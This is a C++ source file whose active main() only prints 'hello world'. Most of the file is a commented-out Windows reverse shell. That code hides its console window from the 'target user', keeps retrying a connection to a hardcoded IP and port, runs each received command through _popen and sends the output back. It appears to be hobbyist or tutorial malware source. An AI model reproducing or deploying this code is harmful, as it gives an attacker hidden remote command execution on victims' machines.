#include "../include/client_tcp.hpp"
#include <cstdio>




int main(void){
  // client_tcp::ClientTcp client;
  // client.ClientInit();

  printf("hello world");

  return 0;
}






/*
int sock;

void shell(void){
  char buffer[1024]{};
  char container[1024]{};
  char total_response[18384]{};

  while(true){
    // jump:
      // bzero(buffer,1024);
      // bzero(container,1024);
      // bzero(total_response,18384);
      memset(buffer,0,sizeof(buffer));
      memset(container,0,sizeof(container));
      memset(total_response,0,sizeof(total_response));
      ssize_t bytes_recived = recv(sock, buffer, sizeof(buffer)-1, 0);
      if(bytes_recived >= 0){
        buffer[bytes_recived] = '\n';
      }

      if(strncmp("q",buffer,1) == 0){
        // shutdown(sock, SHUT_WR);
        closesocket(sock);
        WSACleanup();
        std::exit(0);
      }
      else{
        FILE *fp;
        fp = _popen(buffer,"r");
        while(fgets(container, 1024, fp) != NULL){
          strcat(total_response, container);
        }
        send(sock, total_response, sizeof(total_response), 0);
        fclose(fp);
      }

  }

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){  // these lines hide the console from the target user
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(stealth, 0);// the 0 is same as nCmdShow, unclear why he isnt using the variable directly

  struct sockaddr_in ServAddr;
  unsigned short ServPort = 50005;// unsigned short
  const char *ServIp{"10.0.3.8"};// my machine IP adress =============================================
  WSADATA wsaData;

  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
    std::exit(1);
  }

  sock = socket(AF_INET, SOCK_STREAM, 0);
  memset(&ServAddr, 0, sizeof(ServAddr));
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServIp);
  // inet_pton(AF_INET, ServIp, &ServAddr.sin_addr);
  ServAddr.sin_port = htons(ServPort);

  while(connect(sock, reinterpret_cast<sockaddr *>(&ServAddr), sizeof(ServAddr)) != 0){
    Sleep(10);
  }

  shell();




  return 0;
}


*/